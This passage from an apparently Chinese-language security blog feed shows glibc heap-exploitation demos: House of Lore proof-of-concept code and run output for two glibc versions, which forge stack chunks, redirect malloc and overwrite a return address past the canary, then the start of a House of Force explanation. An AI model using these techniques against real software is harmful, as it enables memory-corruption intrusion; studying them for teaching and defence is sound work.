class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="comment">//victimbk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  <span class="comment">//victim-&gt;bk=stack_buffer_1 bck-&gt;fd=victim</span></span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  <span class="comment">//stack_buffer_1 stack_buffer_1-&gt;bck-&gt;fd=stack_buffer_1</span></span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line"><span class="comment">//vimtimtopchunk</span></span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="comment">//freeunsortbin</span></span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"><span class="comment">//unsortbinunsortbinvictimsmallbin</span></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="comment">//victimbk</span></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="comment">//stack_buffer_1smallbin</span></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="comment">//stack_buffer_1</span></span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Allocating the victim chunk</span><br><span class="line">Allocated the first small chunk on the heap at 0x168d010</span><br><span class="line">stack_buffer_1 at 0x7ffcb1a6c510</span><br><span class="line">stack_buffer_2 at 0x7ffcb1a6c4f0</span><br><span class="line">Create a fake chunk on the stack</span><br><span class="line">Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list</span><br><span class="line">Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()</span><br><span class="line">Allocated the large chunk on the heap at 0x168d120</span><br><span class="line">Freeing the chunk 0x168d010, it will be inserted in the unsorted bin</span><br><span class="line"></span><br><span class="line">In the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)</span><br><span class="line"><span class="meta prompt_">victim-&gt;</span><span class="language-bash">fwd: 0x7fec6bd16b78</span></span><br><span class="line"><span class="meta prompt_">victim-&gt;</span><span class="language-bash">bk: 0x7fec6bd16b78</span></span><br><span class="line"></span><br><span class="line">Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin</span><br><span class="line">This means that the chunk 0x168d010 will be inserted in front of the SmallBin</span><br><span class="line">The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x168d510</span><br><span class="line">The victim chunk has been sorted and its fwd and bk pointers updated</span><br><span class="line"><span class="meta prompt_">victim-&gt;</span><span class="language-bash">fwd: 0x7fec6bd16c78</span></span><br><span class="line"><span class="meta prompt_">victim-&gt;</span><span class="language-bash">bk: 0x7fec6bd16c78</span></span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">Now allocating a chunk with size equal to the first one freed</span><br><span class="line">This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer</span><br><span class="line">This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk</span><br><span class="line">p4 = malloc(0x100)</span><br><span class="line"></span><br><span class="line">The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fec6bd16c78</span><br><span class="line"></span><br><span class="line">p4 is 0x7ffcb1a6c520 and should be on the stack!</span><br><span class="line">Nice jump d00d</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html">https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html</a></p><p><strong>__builtin_return_address</strong> </p><p><strong>__builtin_frame_address</strong> rbp</p></blockquote><h3 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h3><p>31tcachestashstash _int_malloc  smallbin  fastbin  chunk tcache  bin  tcache </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake free-list on the stack\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span></span><br><span class="line">          <span class="string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="type">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing dummy chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>char *p4 &#x3D; malloc(0x100);void *p3 &#x3D; malloc(0x100);smallbinchunktcachetcachesmallbin</p><p>p4 &amp;fake_freelist[4]</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Allocating the victim chunk</span><br><span class="line">Allocated the first small chunk on the heap at <span class="number">0x55641a70e2a0</span></span><br><span class="line">Allocating dummy chunks <span class="keyword">for</span> using up tcache later</span><br><span class="line">stack_buffer_1 at <span class="number">0x7ffed8b0f770</span></span><br><span class="line">stack_buffer_2 at <span class="number">0x7ffed8b0f790</span></span><br><span class="line">Create a fake <span class="built_in">free</span>-<span class="built_in">list</span> on the <span class="built_in">stack</span></span><br><span class="line">fake <span class="built_in">free</span>-<span class="built_in">list</span> at <span class="number">0x7ffed8b0f7f0</span></span><br><span class="line">Create a fake chunk on the <span class="built_in">stack</span></span><br><span class="line">Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last <span class="built_in">malloc</span>, which putting <span class="built_in">stack</span> address on smallbin <span class="built_in">list</span></span><br><span class="line">Set the bk pointer to stack_buffer_2 and <span class="built_in">set</span> the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last <span class="built_in">malloc</span>, which returning pointer to the fake chunk on stackSet the bck pointer of stack_buffer_2 to the fake <span class="built_in">free</span>-<span class="built_in">list</span> in order to prevent crash prevent crash introduced by smallbin-to-tcache mechanism</span><br><span class="line">Allocating another large chunk in order to avoid consolidating the top chunk withthe small one during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line">Allocated the large chunk on the heap at 0x55641a70eb20</span><br><span class="line">Freeing dummy chunk</span><br><span class="line">Freeing the chunk 0x55641a70e2a0, it will be inserted in the unsorted bin</span><br><span class="line"></span><br><span class="line">In the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header <span class="title function_">address</span> <span class="params">(libc addresses)</span></span><br><span class="line">victim-&gt;fwd: 0x7fcfdf28ebe0</span><br><span class="line">victim-&gt;bk: 0x7fcfdf28ebe0</span><br><span class="line"></span><br><span class="line">Now performing a <span class="built_in">malloc</span> that can&#x27;t be handled by the UnsortedBin, nor the small bin</span><br><span class="line">This means that the chunk 0x55641a70e2a0 will be inserted in front of the SmallBin</span><br><span class="line">The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x55641a70ef10</span><br><span class="line">The victim chunk has been sorted and its fwd and bk pointers updated</span><br><span class="line">victim-&gt;fwd: 0x7fcfdf28ece0</span><br><span class="line">victim-&gt;bk: 0x7fcfdf28ece0</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">Now take all dummies chunk in tcache out</span><br><span class="line">Now allocating a chunk with size equal to the first one freed</span><br><span class="line">This should <span class="keyword">return</span> the overwritten victim chunk and <span class="built_in">set</span> the bin-&gt;bk to the injected victim-&gt;bk pointer</span><br><span class="line">This last <span class="built_in">malloc</span> should trick the glibc <span class="built_in">malloc</span> to <span class="keyword">return</span> a chunk at the position injected in bin-&gt;bk</span><br><span class="line">p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">The fwd pointer of stack_buffer_2 has changed after the last <span class="built_in">malloc</span> to <span class="number">0x7ffed8b0f780</span></span><br><span class="line"></span><br><span class="line">p4 is <span class="number">0x7ffed8b0f880</span> and should be on the <span class="built_in">stack</span>!</span><br><span class="line">Nice jump d00d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Force</title>
      <link href="/2023/08/02/house-of-force/"/>
      <url>/2023/08/02/house-of-force/</url>
      
        <content type="html"><![CDATA[<p>2.232.27</p><p>topchunksize-1topchunk</p><p>64binchunktopchunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span></span><br><span class="line">victim = av-&gt;top;<span class="comment">//top chunk</span></span><br><span class="line">size   = chunksize(victim);<span class="comment">//top chunk</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))<span class="comment">//nb+chunkhead 0x10MINSIZEsize320x10640x20</span></span><br><span class="line">&#123;                                                             <span class="comment">//topchunk</span></span><br><span class="line">    remainder_size = size - nb;<span class="comment">//topchunk</span></span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);<span class="comment">//</span></span><br><span class="line">    av-&gt;top        = remainder;<span class="comment">//top chunk</span></span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);<span class="comment">//top chunksize</span></span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mallocmalloc_sizetopchunktarget-0x10chunkhead</p><p>target-0x10&#x3D;remainder&#x3D;chunk_at_offset(victim, nb)&#x3D;victim+nb&#x3D;victim+mallocsize+0x10</p><p><strong>mallocsize&#x3D;target-0x20-victim</strong></p><p>void *__libc_malloc(size_t bytes) mallocsizechecked_request2sizesize</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz) \reqmallocsizeszsize</span></span><br><span class="line">(&#123;                    \</span><br><span class="line">  (sz) = request2size (req);        \</span><br><span class="line">  <span class="keyword">if</span> (((sz) &lt; (req))            \</span><br><span class="line">      || REQUEST_OUT_OF_RANGE (sz)) \</span><br><span class="line">    &#123;                    \</span><br><span class="line">      __set_errno (ENOMEM);        \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;                \</span><br><span class="line">    &#125;                    \</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 